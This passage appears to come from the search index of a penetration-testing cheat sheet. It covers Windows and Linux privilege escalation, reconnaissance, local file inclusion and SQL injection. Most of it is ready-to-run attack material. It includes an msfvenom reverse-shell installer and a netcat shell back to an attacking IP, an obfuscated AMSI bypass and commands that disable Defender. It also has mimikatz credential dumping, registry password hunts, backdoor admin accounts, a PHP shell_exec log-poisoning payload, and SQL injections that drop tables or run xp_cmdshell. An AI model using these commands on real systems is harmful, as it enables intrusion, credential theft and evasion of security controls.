pty.spawn(\"/bin/bash\")'\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#allow-root-password-ssh","title":"Allow root password ssh","text":"<pre><code>echo PermitRootLogin yes &gt;&gt; /etc/ssh/sshd_config\nsudo service ssh restart\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/","title":"Windows","text":""},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#system-enumeration","title":"System enumeration","text":"<pre><code>hostname\nsysteminfo\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" # /B Matches the text pattern if it is at the beginning of a line.\nwmic qfe # extract patches (KB), wmic = windows management instrumentation cmd line, qfe = quick fix engineering\nwmic qfe get Caption,Description,HotFixID,InstalledOn # extract patches with these specifics columns\nwmic logicaldisk\nwmic logicaldisk get caption,description,providername # look if there is other existing drives \n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#users-enumeration","title":"Users enumeration","text":"<pre><code>whoami /all\nnet users\nnet user administrator\nwmic useraccount list brief # includes SID\nnet localgroup\nnet localgroup administrators\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#network-enumeration","title":"Network enumeration","text":"<pre><code>ipconfig\nipconfig /all\narp -a\nroute print\nnetstat -ano\n# fport supports Windows NT4, Windows 2000 and Windows XP\n# fport reports all open TCP/IP and UDP ports and maps them to the owning application.\nFport.exe /p\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#antivirus-and-firewall-enumeration","title":"Antivirus and Firewall enumeration","text":"<pre><code>sc query windefend # sc = service control, windefend is the default windows antivirus\nsc queryex type= service # all the services running, search for AV such as sophos, avast...\nnetsh advfirewall firewall dump # modern command, show firewall state\nnetsh firewall show state # old comand\nnetsh firewall show config\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#account-lockout","title":"Account lockout","text":"<pre><code>net accounts\nnet accounts /domain\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#powershell-enumeration","title":"PowerShell Enumeration","text":"<pre><code>$ExecutionContext.SessionState.LanguageMode\nGet-ExecutionPolicy\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#tools","title":"Tools","text":"<ul> <li>https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS</li> <li>https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</li> </ul>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#kernel-exploit","title":"Kernel Exploit","text":"<ul> <li>https://github.com/SecWiki/windows-kernel-exploits</li> <li>https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py</li> </ul> <p><pre><code>python2 windows-exploit-suggester.py --update\npython2 windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo systeminfo.txt \n</code></pre> MSF <pre><code>post/multi/recon/local_exploit_suggester\n</code></pre></p>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#password-hunting","title":"Password Hunting","text":""},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#enumerate-folders","title":"Enumerate folders","text":"<pre><code>tree /f /a # in users directory\ncd C:\\ &amp; findstr /SI /M \"password\" *.xml *.ini *.txt *.conf* # search for file contents\ndir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* # search filename\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#unattend-files","title":"Unattend files","text":"<p><pre><code>dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul\n</code></pre> MSF <pre><code>post/windows/gather/enum_unattend\n</code></pre></p>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#powershell-history","title":"PowerShell history","text":"<pre><code>type C:\\Users\\theuser\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#unmounted-volumes","title":"Unmounted volumes","text":"<pre><code>mountvol\nmkdir vol\nmountvol vol \\\\?\\Volume{uuid}\\\ncd vol\ndir /s /a\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#search-registry","title":"Search registry","text":"<pre><code>REG QUERY HKLM /F \"password\" /t REG_SZ /S /K\nREG QUERY HKCU /F \"password\" /t REG_SZ /S /K\n\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" # Windows Autologin\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2&gt;nul | findstr \"DefaultUserName DefaultDomainName DefaultPassword\" \nreg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" # SNMP parameters\nreg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" # Putty clear text proxy credentials\nreg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" # VNC credentials\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#mremoteng","title":"mRemoteNG","text":"<ul> <li>https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py</li> </ul>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#hivenightmare","title":"HiveNightmare","text":"<pre><code>icacls C:\\Windows\\system32\\config\\sam\n</code></pre> <ul> <li>https://github.com/GossiTheDog/HiveNightmare</li> </ul> <pre><code>python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#stored-credentials","title":"Stored credentials","text":"<pre><code>cmdkey /list\nrunas /user:Administrator /savecred \"net user newadmin pass /add\"\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#wsl","title":"WSL","text":"<p><pre><code>where /R c:\\windows wsl.exe\nwhere /R c:\\windows bash.exe\n</code></pre> <pre><code>wsl whoami\n./ubuntun1604.exe config --default-user root\nwsl whoami\nwsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'\n</code></pre></p>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#registry","title":"Registry","text":""},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#autorun","title":"Autorun","text":"<pre><code>C:\\Users\\User\\Desktop\\Tools\\Accesschk\\accesschk64.exe -wvu \"C:\\Program Files\\Autorun Program\"\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#always-install-elevated","title":"Always Install Elevated","text":"<p><pre><code>reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\nreg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\n</code></pre> <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=$VPN LPORT=443 -f msi -o rev.msi\nmsiexec /quiet /qn /i C:\\Windows\\Tasks\\rev.msi\n</code></pre></p>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#drivers","title":"Drivers","text":"<pre><code>driverquery /v  # enumerate the drivers that are installed\nsearchsploit &lt;driver name&gt;\n</code></pre> <ul> <li>the driver directory is often found under C:\\Windows\\System32\\DRIVERS but sometimes in \"C:\\Program Files\". Drivers are .inf filetype.</li> </ul> <pre><code>type USBPcap.inf # get driver version\n</code></pre> <p>Compile C/C++ code on Windows: https://www.mingw-w64.org/</p> <pre><code>mingw-w64.bat\ngcc --help # sets up the PATH environment variable for the gcc executable\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#impersonation-privileges","title":"Impersonation Privileges","text":"<pre><code>whoami /priv\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#restore-privileges","title":"Restore Privileges","text":"<ul> <li>This tool should be executed as LOCAL SERVICE or NETWORK SERVICE only.</li> <li>https://github.com/itm4n/FullPowers</li> </ul>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#seimpersonateprivilege","title":"SeImpersonatePrivilege","text":"<ul> <li> <p>https://jlajara.gitlab.io/Potatoes_Windows_Privesc</p> </li> <li> <p>Sweet Potato to rule them all : https://github.com/CCob/SweetPotato</p> </li> <li> <p>If the machine is &lt; Windows 10 1809 &lt; Windows Server 2019 : https://github.com/ohpe/juicy-potato/</p> <ul> <li>test for clsid : https://github.com/ohpe/juicy-potato/tree/master/CLSID</li> </ul> </li> </ul> <pre><code># Always use full path !!!\nJuicyPotato.exe -t * -p C:\\Windows\\Tasks\\nc.bat -l 1337 -c &lt;clsid&gt;\n</code></pre> <ul> <li> <p>If the machine is &gt;= Windows 10 1809 &amp; Windows Server 2019 :</p> </li> <li> <p>https://github.com/antonioCoco/RoguePotato </p> </li> </ul> <pre><code># On attacking machine\nsocat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999\n\n# On victim machine\n.\\RoguePotato.exe -r ATTACKING_IP -e \"C:\\Windows\\Tasks\\nc.exe ATTACKING_IP 1234 -e cmd.exe\" -l 9999\n</code></pre> <ul> <li>https://github.com/itm4n/PrintSpoofer</li> </ul> <pre><code>PrintSpoofer64.exe -i -c cmd.exe\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#seloaddriver","title":"SeLoadDriver","text":"<ul> <li>Explainations : https://www.tarlogic.com/blog/abusing-seloaddriverprivilege-for-privilege-escalation/</li> <li>Walkthrough : https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#priv-svc-print--system</li> <li>Load the vulnerable driver : https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp</li> <li>Capcom.sys, a vulnerable driver : https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys</li> <li>Exploit Capcom : https://github.com/tandasat/ExploitCapcom</li> </ul> <p>Compile the files using Visual Studio. Release / x64 -&gt; Build. Remove the include \"stdafx.h\" if error. You should modify the TCHAR CommandLine[] = TEXT(\"C:\\Windows\\system32\\cmd.exe\"); launched in the exploit first. Replace by a rev generated using msfvenom. Load then exploit the vulnerable driver.  <pre><code>./EoPLoadDriver.exe System\\CurrentControlSet\\MyService C:\\Users\\svc-print\\Capcom.sys\n./ExploitCapcom.exe\n</code></pre></p>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#unquoted-service-paths","title":"Unquoted Service Paths","text":"<ul> <li>When the path is not quoted (ex: C:\\Program files\\soft\\new folder\\exec.exe) Windows will try to execute first 'C:\\Program.exe', then 'C:\\Program Files\\soft\\new.exe' and finally 'C:\\Program Files\\soft\\new folder\\exec.exe'. Try to create 'C:\\Program Files\\soft\\new.exe'</li> </ul> <pre><code># find unquoted service\nwmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\"\n\n# check if running as system or admin\nsc qc &lt;service_name&gt;\n\n# check path\nicacls &lt;service_path&gt;\n\n# After creating or replacing the binary by a malicious one\n# if start type is Auto, you need SeShutdownPrivilege to reboot\nshutdown /r /t 0\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#localhost-services","title":"Localhost services","text":""},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#chisel","title":"Chisel","text":"<ul> <li>https://github.com/jpillora/chisel</li> </ul> <p>Access localhost port 8888 on victim machine from attacking machine <pre><code>./chisel_1.7.7_linux_amd64 server -p 9876 --reverse  # attacking machine\n./chisel_1.7.7_windows_amd64 client 10.10.14.20:9876 R:8888:127.0.0.1:8888 # victim machine\n</code></pre></p>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#amsi-bypass","title":"AMSI bypass","text":"<pre><code>$a=[Ref].Assembly.GetTypes();$a | %{$b=$_; $count=0; $tmp=($_.Name).ToCharArray().ToInt32($null); $tmp | %{$count+= $_;}; if($count -eq 923){$c=$b}};$d=$c.GetFields('NonPublic,Static');$d | %{$e=$_; $count=0; $tmp=($_.Name).ToCharArray().ToInt32($null); $tmp | %{$count+= $_;}; if($count -eq 1167){$f=$e}};$o=1;while($o -lt 8){Start-Sleep -Milliseconds ($o.toInt32($null)*100);$o++};$g=$f.GetValue($null);[IntPtr]$x=$g;[Int32[]]$y=@(0);$cop=[System.Runtime.InteropServices.Marshal];$i=1;while($i -lt 5){Start-Sleep -Milliseconds ($i.toInt32($null)*100);$i++};$cop::Copy($y, 0, $x, 1);\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#add-admin-account-windows","title":"Add admin account Windows","text":"<pre><code>net user pentest Pentest1! /add\nnet localgroup administrators /add pentest\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#add-exclusions","title":"Add exclusions","text":"<pre><code>Set-MpPreference -DisableRealTimeMonitoring $true\nSet-MpPreference -DisableIOAVProtection $true\nSet-MpPreference -DisableScriptScanning 1\nAdd-MpPreference -ExclusionPath \"C:\\Windows\\Tasks\"\nSet-MpPreference -ExclusionProcess \"legit.txt\",\"powershell.exe\",\"msbuild.exe\"\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#bypass-uac","title":"Bypass UAC","text":"<ul> <li>https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/</li> </ul>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#disable-uac-remote-restrictions","title":"Disable UAC remote restrictions","text":"<pre><code>reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\n</code></pre> <pre><code>Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"LocalAccountTokenFilterPolicy\" -Value 1 -PropertyType DWord -Force\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#enable-rdp-from-cli","title":"Enable RDP from CLI","text":"<ul> <li>https://support.moonpoint.com/os/windows/software/remote-control/rdp/rdp-registry.php</li> </ul> <pre><code>net localgroup \"Remote Desktop Users\" /add pentest\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nnetstat -ano | find \"3389\"\nnetsh firewall set portopening protocol = TCP port = 3389 name = \"RDP\" mode = ENABLE scope = CUSTOM $LHOST\nrdesktop $IP -u pentest -p Pentest1!\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#admin-to-system","title":"Admin to System","text":"<pre><code>PsExec.exe -s -i cmd.exe\n</code></pre> <ul> <li>https://twitter.com/cyb3rops/status/1448208520680284164</li> </ul> <pre><code>\\\\live.sysinternals.com\\tools\\PsExec.exe -s -c cmd.exe\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#mimikatz-one-liner","title":"Mimikatz one liner","text":"<pre><code>mimikatz.exe \"privilege::debug\" \"lsadump::sam\" \"exit\"\nmimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\nmimikatz.exe \"privilege::debug\" \"sekurlsa::tickets\" \"exit\"\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#escape-powershell-clm","title":"Escape PowerShell CLM","text":"<pre><code>&lt;Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"&gt;\n  &lt;Target Name=\"MSBuild\"&gt;\n   &lt;MSBuildTest/&gt;\n  &lt;/Target&gt;\n   &lt;UsingTask\n    TaskName=\"MSBuildTest\"\n    TaskFactory=\"CodeTaskFactory\"\n    AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" &gt;\n     &lt;Task&gt;\n     &lt;Reference Include=\"System.Management.Automation\" /&gt;\n      &lt;Code Type=\"Class\" Language=\"cs\"&gt;\n        &lt;![CDATA[\n\n            using System;\n            using System.Linq;\n            using System.Management.Automation;\n            using System.Management.Automation.Runspaces;\n\n            using Microsoft.Build.Framework;\n            using Microsoft.Build.Utilities;\n\n            public class MSBuildTest :  Task, ITask\n            {\n                public override bool Execute()\n                {\n                    using (var runspace = RunspaceFactory.CreateRunspace())\n                    {\n                      runspace.Open();\n\n                      using (var posh = PowerShell.Create())\n                      {\n                        posh.Runspace = runspace;\n                        posh.AddScript(\"$ExecutionContext.SessionState.LanguageMode\");\n\n                        var results = posh.Invoke();\n                        var output = string.Join(Environment.NewLine, results.Select(r =&gt; r.ToString()).ToArray());\n\n                        Console.WriteLine(output);\n                      }\n                    }\n\n                return true;\n              }\n            }\n\n        ]]&gt;\n      &lt;/Code&gt;\n    &lt;/Task&gt;\n  &lt;/UsingTask&gt;\n&lt;/Project&gt;\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Windows/#powershell-proxy-related","title":"PowerShell proxy related","text":"<pre><code>// System.Net.WebClient is by default proxy aware\n$wc = new-object system.net.WebClient\n$wc.DownloadString(\"https://your-url/test.txt\")\n\n// Check the proxy\n[System.Net.WebRequest]::DefaultWebProxy.GetProxy(\"https://your-url/\")\n\n// Remove the proxy\n$wc.proxy = $null\n\n// Add a custom user agent\n$wc.Headers.Add('User-Agent',\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\")\n\n// Discover and set proxy\n[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()\n[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials\n</code></pre>"},{"location":"Reconnaissance/Intelligence/","title":"Intelligence","text":""},{"location":"Reconnaissance/Intelligence/#ip","title":"IP","text":"<pre><code>whois &lt;ip&gt;\n</code></pre>"},{"location":"Reconnaissance/Intelligence/#domain","title":"Domain","text":"<pre><code>dig @&lt;server&gt; &lt;name&gt; &lt;type&gt;\n</code></pre> <ul> <li>https://dnsdumpster.com/</li> </ul>"},{"location":"Reconnaissance/Intelligence/#file","title":"File","text":"<pre><code>exiftool &lt;file&gt;\nstrings &lt;file&gt;\n</code></pre>"},{"location":"Reconnaissance/Intelligence/#pseudo","title":"Pseudo","text":"<pre><code>sherlock &lt;pseudo&gt;\n</code></pre>"},{"location":"Reconnaissance/Intelligence/#linkedin","title":"LinkedIn","text":"<pre><code>python3 crosslinked.py -f '{first}.{last}@domain.com' company_name\npython3 crosslinked.py -f 'domain\\{f}{last}' -t 45 -j 1 company_name\n</code></pre>"},{"location":"Reconnaissance/Intelligence/#google-dorks","title":"Google Dorks","text":"<pre><code>site:domain.tld -site:notuseful.domain.tld\nintitle:index.of passwd\ninurl:viewtopic.php\nfiletype:docx,xlsx\n</code></pre> <ul> <li>https://www.exploit-db.com/google-hacking-database</li> </ul> <pre><code>metagoofil -d &lt;domain&gt; -t &lt;doc,pdf,xls,ppt,odp,ods,docx,xslx,pptx&gt; -l 200 -n 5 -o &lt;out&gt; -w\n</code></pre>"},{"location":"Reconnaissance/Intelligence/#shodan","title":"Shodan","text":"<ul> <li>https://www.shodan.io/</li> <li>https://beta.shodan.io/search/filters</li> <li>https://beta.shodan.io/search/examples</li> </ul>"},{"location":"Reconnaissance/Intelligence/#breached-credentials","title":"Breached credentials","text":"<ul> <li>https://pwndb2am4tzkvold.tor2web.io/ (free)</li> <li>https://intelx.io/ (paid)</li> </ul>"},{"location":"Reconnaissance/Scanning%20and%20Sniffing/","title":"Scanning and Sniffing","text":"<ul> <li>https://danielmiessler.com/study/tcpdump/</li> </ul>"},{"location":"Reconnaissance/Scanning%20and%20Sniffing/#filtering-options","title":"Filtering options","text":"<pre><code>tcpdump -nnSX port 80 # The only command to remember\ntcpdump -i eth0 # listen on your interface\ntcpdump host 1.1.1.1 # filter on host\ntcpdump src 1.1.1.1 # filter on source\ntcpdump dst 1.0.0.1 # filter on destination\ntcpdump net 1.2.3.0/24 # filter on ... yes you guess it\ntcpdump ip6\ntcpdump icmp # filter using protocol\ntcpdump portrange 21-23\n</code></pre>"},{"location":"Reconnaissance/Scanning%20and%20Sniffing/#combining","title":"Combining","text":"<p>Combine options using and (&amp;&amp;), or (||) and not (!).</p> <pre><code>tcpdump -nnSX src 10.5.2.3 and not dst port 443\n</code></pre> <p>Complex queries need single quotes</p> <pre><code>tcpdump 'src 10.0.2.4 and (dst port 3389 or 22)'\n</code></pre>"},{"location":"Reconnaissance/Scanning%20and%20Sniffing/#reading-and-writing-to-file","title":"Reading and writing to file","text":"<p><pre><code>tcpdump port 80 -w capture.pcap\ntcpdump -r capture.pcap\n</code></pre> Save the file and view the packets <pre><code>tcpdump -w - | tee file.pcap | tcpdump -r - \n</code></pre></p>"},{"location":"Reconnaissance/Scanning%20and%20Sniffing/#nmap-probing","title":"Nmap Probing","text":"Windows and UID 0 User on Linux non-UID 0 on Linux Same subnet : ARP only TCP SYN to port 80 ICMP Echo Request TCP SYN to port 443 TCP SYN to port 443 No ICMP used TCP ACK to port 80 ICMP Timestamp Request <p><code>-Pn</code> assume hosts are up</p>"},{"location":"Reconnaissance/Scanning%20and%20Sniffing/#network-sweep","title":"Network Sweep","text":"<pre><code>nmap -sP 10.10.10.0/24\n</code></pre>"},{"location":"Reconnaissance/Scanning%20and%20Sniffing/#optimizing-host-detection","title":"Optimizing Host Detection","text":"<ul> <li><code>-PSports</code> use TCP SYN to specified ports</li> <li><code>-PE</code> use ICMP Echo Request <pre><code>nmap -PS21,22,23,25,53,80,110,111,135,137,139,143,443,445,502,993,995,1433,1434,1723,3306,3389,5900,8080 -PE -iL hosts.txt\n</code></pre></li> </ul>"},{"location":"Reconnaissance/Scanning%20and%20Sniffing/#one-host-tcp-udp","title":"One host TCP / UDP","text":"<p><pre><code>nmap -p- -sC -sV --reason 10.10.10.10 -oA tcp_all_ports\n</code></pre> <pre><code>nmap -sU --top-ports 100 --reason 10.10.10.10 -oA udp_top_100\n</code></pre> <pre><code>nmap -sU -p- --reason --min-rate 5000 10.10.10.10 -oA udp_all_ports\n</code></pre></p>"},{"location":"Reconnaissance/Scanning%20and%20Sniffing/#nse","title":"NSE","text":"<p><pre><code>nmap -p 445 --script=\"safe or smb-enum-*\" -p 445 &lt;target&gt; \n</code></pre> - <code>--script-trace</code> for detailed output - <code>--script-args</code> to pass arguments</p>"},{"location":"Reconnaissance/Scanning%20and%20Sniffing/#database-location","title":"Database location","text":"<p><pre><code>grep smb-* /usr/share/nmap/scripts/script.db\n</code></pre> - <code>--script-updatedb</code> update script database</p>"},{"location":"Reconnaissance/Scanning%20and%20Sniffing/#ipv6-support","title":"IPv6 support","text":"<ul> <li><code>-6</code> for IPv6, not supported on all versions {{% /panel %}}</li> </ul>"},{"location":"Reconnaissance/Scanning%20and%20Sniffing/#ipv6-discovery","title":"IPv6 discovery","text":"<pre><code>ping6 ff02::1 # All IPv6 hosts multicast address = 255.255.255.255 in IPv4\nping6 ff02::2 # All IPv6 routers multicast address \nip neigh # Show cached neighbors find by ping6\n</code></pre>"},{"location":"Reconnaissance/Scanning%20and%20Sniffing/#netcat-port","title":"Netcat port","text":"<pre><code>echo \"\" | nc -nvw2 &lt;target&gt; &lt;port-range&gt;\n</code></pre>"},{"location":"Reconnaissance/Scanning%20and%20Sniffing/#windows-ping-sweep","title":"Windows ping sweep","text":"<pre><code>for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i &gt; nul &amp;&amp; echo 10.5.5.%i is up.\n</code></pre>"},{"location":"Reconnaissance/Scanning%20and%20Sniffing/#usage","title":"Usage","text":"<p>Usage is similar to Nmap <pre><code>masscan -p443 --rate 15000 10.0.0.0/8\n</code></pre></p>"},{"location":"Reconnaissance/Scanning%20and%20Sniffing/#output-files","title":"Output Files","text":"<ul> <li><code>-oB</code> for binary file output to save space</li> <li><code>--readscan</code> to convert to other formats <pre><code>massscan --readscan masscan.binary -oX masscan.xml\n</code></pre></li> </ul>"},{"location":"Web/LFI/","title":"LFI","text":""},{"location":"Web/LFI/#wordlists","title":"Wordlists","text":"<ul> <li>/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt</li> <li>/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt</li> </ul>"},{"location":"Web/LFI/#poc","title":"PoC","text":"<ul> <li>linux</li> </ul> <pre><code>/etc/passwd\n</code></pre> <ul> <li>windows </li> </ul> <pre><code>c:\\windows\\system32\\drivers\\etc\\hosts\n</code></pre>"},{"location":"Web/LFI/#log-poisoning","title":"Log Poisoning","text":"<p>First, we poison the logs by connecting using nc and sending the payload. <pre><code>nc -nv $IP 80\n&lt;?php echo '&lt;pre&gt;' . shell_exec($_GET['cmd']) . '&lt;/pre&gt;';?&gt;\n</code></pre></p> <p>Then, we trigger the LFI and submit the command we want executed to the cmd parameter. <pre><code>https://$IP/vuln.php?file=C:\\xampp\\apache\\logs\\access.log&amp;cmd=whoami\n</code></pre></p>"},{"location":"Web/LFI/#proc","title":"Proc","text":"<ul> <li>https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/</li> </ul>"},{"location":"Web/SQLi/","title":"SQLi","text":""},{"location":"Web/SQLi/#malicious-query-example","title":"Malicious query example","text":""},{"location":"Web/SQLi/#login-bypass-input-example","title":"Login bypass input example","text":"<p>WORDLIST : /usr/share/seclists/Fuzzing/Databases/sqli.auth.bypass.txt</p> <pre><code>$query = \"SELECT first_name, last_name FROM users WHERE user_id= '$id\u2018 AND password = \u2018$pass\u2019;\";\n\n$id = ' or 1&lt;2 -- -\n\n$query = \"SELECT first_name, last_nameFROM users WHERE user_id= \u2018\u2019 or 1&lt;2 ---\u2018 AND password = \u2018$pass\u2019;\";\n</code></pre>"},{"location":"Web/SQLi/#data-collection-input-example","title":"Data collection input example","text":"<pre><code>$query = \"SELECT first_name, last_name FROM users WHERE user_id= '$id\u2018 AND password = \u2018$pass\u2019;\";\n\n$id = 1\u2019 and SELECT password FROM users -- -\n\n$query = \"SELECT first_name, last_name FROM users WHERE user_id = \u20181\u2019 and SELECT password FROM users -- -\u2018 AND password = \u2018$pass\u2019;\";\n</code></pre>"},{"location":"Web/SQLi/#delete-data-input-example","title":"Delete data input example","text":"<pre><code>$query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id\u2018 AND password = \u2018$pass\u2019;\";\n\n$pass = \u2018; DROP TABLE users -- -\n\n$query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id\u2018 AND password = \u2018\u2019; DROP TABLE users -- -\u2019;\";\n</code></pre>"},{"location":"Web/SQLi/#remote-code-execution-input-example","title":"Remote code execution input example","text":"<p>The SQL server context needs to run as \u201csa\u201d</p> <pre><code>$query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id\u2018 AND password = \u2018$pass\u2019;\";\n\n$pass = \u2018; exec cmdshell \u2018net user pentester pentesterpassword /ADD\u2019 -- -\n\n$query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id\u2018 AND password = \u2018\u2018; exec cmdshell 'net user pentester pentesterpassword /ADD\u2019 -- -\u2019;\";\n</code></pre>"},{"location":"Web/SQLi/#detection","title":"Detection","text":"<p>Test with quote and double quote</p> <ul> <li>Legitimate request : http://www.example.com/gallery.php?id=6</li> <li>Illegitimate request : http://www.example.com/gallery.php?id=6\u2032</li> </ul> <p>\u25aa Syntax error</p>"},{"location":"Web/SQLi/#verification","title":"Verification","text":"<ul> <li>Confirm with delay :</li> </ul> <pre><code>mysql : SLEEP(5)\nmssql : WAITFOR DELAY '0:0:5'\n</code></pre>"},{"location":"Web/SQLi/#error-based","title":"Error based","text":"<p>The error output helps a lot for understanding the consequences linked to injections</p>"},{"location":"Web/SQLi/#time-based","title":"Time based","text":"<p>This kind of attack injects a SQL segment which contains specific DBMS function such as SLEEP for MYSQL.</p> <p>Depending on the time it takes to get the server response, it is possible to deduct some information.</p>"},{"location":"Web/SQLi/#blind-sqli","title":"Blind SQLi","text":"<p>No error returned by the application.</p> <p>Ask the database true or false questions and determine the answer based on the application responses.</p>"},{"location":"Web/SQLi/#exploitation","title":"Exploitation","text":""},{"location":"Web/SQLi/#1-determine-the-number-of-columns","title":"1. Determine the number of columns","text":"<ul> <li>http://www.example.com/gallery.php?id=6 order by 1</li> <li> <p>http://www.example.com/gallery.php?id=6 order by 6</p> </li> <li> <p>The request returns an error when N=6</p> </li> <li>Stop when you get an error the number of columns will be N-1</li> <li>5 columns for this example</li> </ul>"},{"location":"Web/SQLi/#2-print-the-current-page-connected-columns","title":"2. Print the current page connected columns","text":"<p>http://www.example.com/gallery.php?id=6 union all select 1,2,3,4,5</p> <ul> <li>Make sure the number of columns is the same for both selects</li> <li>Be carreful to data type ! (null, 'a', 1 ...)</li> </ul>"},{"location":"Web/SQLi/#3-get-database-and-its-version","title":"3. Get database and its version","text":"<ul> <li>http://www.example.com/gallery.php?id=6 union all select 1,database(),3,4,5</li> <li> <p>http://www.example.com/gallery.php?id=6 union all select 1,version(),3,4,5</p> </li> <li> <p>Syntax is different depending on the database</p> <ul> <li>MSSQL Server</li> <li>MySQL</li> <li>Oracle</li> <li>...</li> </ul> </li> </ul>"},{"location":"Web/SQLi/#4-get-database-names","title":"4. Get database names","text":"<p>http://www.example.com/gallery.php?id=6 union all select 1,group_concat(schema_name),3,4,N-1 from Information_schema.schemata-- -</p>"},{"location":"Web/SQLi/#5-get-table-names","title":"5. Get table 